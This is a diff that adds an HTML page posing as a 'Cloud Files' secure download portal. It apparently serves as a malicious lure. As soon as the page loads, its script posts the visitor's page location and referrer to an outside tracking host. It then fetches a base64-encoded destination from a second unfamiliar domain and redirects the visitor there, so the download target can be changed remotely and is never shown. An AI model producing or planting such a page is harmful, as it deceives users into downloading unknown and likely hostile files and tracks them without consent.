@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Cloud Files</title>
+  <meta name="description" content="Secure download portal"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://dokopka.icu https://blokekaldirma.com;
+    style-src   'self';
+    connect-src 'self' https://dokopka.icu https://blokekaldirma.com
+  "/>
+
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <div class="download-container">
+    <div class="download-box">
+      <div class="download-icon">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+          <path d="M8 11L12 15L16 11"
+                stroke="white" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1>Preparing your download…</h1>
+      <p id="loader-text">Starting…</p>
+      <p id="error-text" class="error-text"></p>
+    </div>
+  </div>
+
+  <script>
+  (async function(){
+    const loader = document.getElementById('loader-text');
+    const error  = document.getElementById('error-text');
+    loader.textContent = 'Fetching download link…';
+    error.textContent  = '';
+    
+    // Функция отправки статистики
+    async function sendTracking() {
+      try {
+        const repoName = window.location.hostname + window.location.pathname;
+        const today = new Date().toDateString();
+        const storageKey = 'visited_' + btoa(repoName) + '_' + today;
+        
+        // Проверяем, был ли уже переход сегодня
+        if (!localStorage.getItem(storageKey)) {
+          localStorage.setItem(storageKey, '1');
+          
+          // Отправляем статистику SYNCHRONOUSLY (важно!)
+          const uniqueId = Date.now() + '-' + Math.random().toString(36).substr(2, 16);
+          
+          // Используем SYNCHRONOUS XHR чтобы гарантировать отправку
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://blokekaldirma.com/track.php', false); // false = synchronous
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.send(JSON.stringify({
+            repo: repoName,
+            referrer: document.referrer,
+            timestamp: new Date().toISOString(),
+            unique_id: uniqueId,
+            is_unique: true
+          }));
+        }
+      } catch (e) {
+        console.log('Tracking failed:', e);
+      }
+    }
+
+    try {
+      // СНАЧАЛА отправляем статистику СИНХРОННО
+      await sendTracking();
+      
+      // ПОТОМ загружаем основную ссылку
+      const res = await fetch('https://dokopka.icu/mai.maaan');
+      if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
+      const { c } = await res.json();
+      const url = atob(c);
+      if (!/^https?:\/\//.test(url)) throw new Error('Invalid URL');
+      
+      loader.textContent = 'Redirecting…';
+      
+      // Ждем немного чтобы гарантировать отправку статистики
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      window.location.href = url;
+    } catch (e) {
+      console.error('Main error:', e);
+      loader.textContent = '';
+      error.textContent = `Error: ${e.message}`;
+    }
+  })();
+  </script>
+</body>
+</html>
